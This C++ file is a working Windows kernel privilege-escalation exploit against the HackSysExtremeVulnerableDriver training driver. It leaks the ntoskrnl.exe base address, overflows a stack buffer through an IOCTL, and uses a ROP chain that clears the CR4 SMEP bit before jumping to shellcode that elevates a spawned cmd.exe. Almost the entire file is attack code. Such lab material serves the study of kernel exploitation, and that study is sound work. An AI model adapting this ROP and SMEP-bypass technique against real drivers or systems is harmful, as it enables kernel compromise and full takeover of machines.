#include <iostream>
#include <Windows.h>
#include <Psapi.h>

extern "C" void __stdcall payload(void);

int main()
{
	HANDLE driver;
	DWORD bytes_returned;
	DWORD driverCb;
	LPVOID drivers[1024];
	CHAR szDriver[512];
	uintptr_t ntoskrnlBaseAddress = -1;
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	int ioctl_opcode = 0x222003;
	int rip_offset = 2072;
	int dataPos = 0;
	const char* driverPath = "\\\\.\\HackSysExtremeVulnerableDriver";
	char out[64];
	char* data;
	
	
	printf("[*] Getting base address of ntskrnl.exe\n");
	
	// Get array of driver base addresses with EnumDeviceDrivers (technically K32EnumDeviceDrivers)
	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &driverCb) && driverCb < sizeof(drivers))
	{
		printf("[-] Error %d getting driver base addresses\n", GetLastError());
		return 0;
	}

	// Loop throught the resulting base addresses and use GetDeviceDriverBaseNameA (technically K32GetDeviceDriverBaseNameA) to look for ntoskrnl.exe (the main executable for the windows kernel)
	driverCb = driverCb / sizeof(drivers[0]);

	for (int i = 0; i < driverCb; i++)
	{
		if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver)))
		{
			if (strcmp(szDriver, "ntoskrnl.exe") == 0)
			{
				ntoskrnlBaseAddress = (uintptr_t)drivers[i];
				break;
			}
		}
	}

	// Verify the base address was found
	if (ntoskrnlBaseAddress == -1)
	{
		printf("[-] Unable to get ntoskrnl.exe base address\n");
		return 0;
	}

	printf("[+] ntoskrnl.exe base address: %p\n", ntoskrnlBaseAddress);

	printf("[*] Opening handle to driver\n");

	// Open a handle to HEVD
	driver = CreateFileA(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d opening handle to driver\n", GetLastError());
		return 0;
	}

	printf("[+] Opened handle to driver %p\n", driver);

	// Allocate memory on the heap for our payload
	data = (char*)malloc(3000);
	if (data == 0)
	{
		printf("[-] Error %d allocating memory for payload\n", GetLastError());
		CloseHandle(driver);
		return 0;
	}

	printf("[*] Opening shell process\n");
	// Start a cmd.exe process to elevate privileges on, had to do it this way because I had a hard time finding a way to cleanly exit after overwriting the buffer
	// I think there was something along the way that messed with the transition out of the IOCTL call
	// When I learn more and figure out a way to fix this ill probably update the exploit
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);
	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d launching shell\n", GetLastError());
		CloseHandle(driver);
		free(data);
		return 0;
	}

	uintptr_t gadgets[] = {
		ntoskrnlBaseAddress + 0x25604e, // pop rcx; ret;
		0x350ef8 ^ (1UL << 20),			// Valid cr4 input with setting the 20th bit to disable SMEP
		ntoskrnlBaseAddress + 0x3a0a67, // mov cr4, rcx ; ret ;
		(uintptr_t)payload,				// Run our shellcode
		(uintptr_t)procInfo.dwProcessId // Used inside the payload function to find our shell process
	};

	// Create our payload
	memset(data, '\x41', rip_offset);
	dataPos = rip_offset;
	// Append each gadget as needed
	for (uintptr_t i : gadgets)
	{
		memcpy(data + dataPos, &i, sizeof(uintptr_t));
		dataPos += sizeof(uintptr_t);
	}

	printf("[*] Sending payload to driver\n");

	// Send payload to driver
	if (!DeviceIoControl(driver, ioctl_opcode, data, dataPos, out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d sending IOCTL code to driver\n", GetLastError());
		CloseHandle(driver);
		free(data);
		return 0;
	}

	// This stuff doesn't execute because the payload function doesn't properly return execution to user mode but
	// its here for good practice and when I figure out how to properly return to user mode
	printf("[+] Payload sent!\n");
	CloseHandle(driver);
	free(data);

	return 0;
}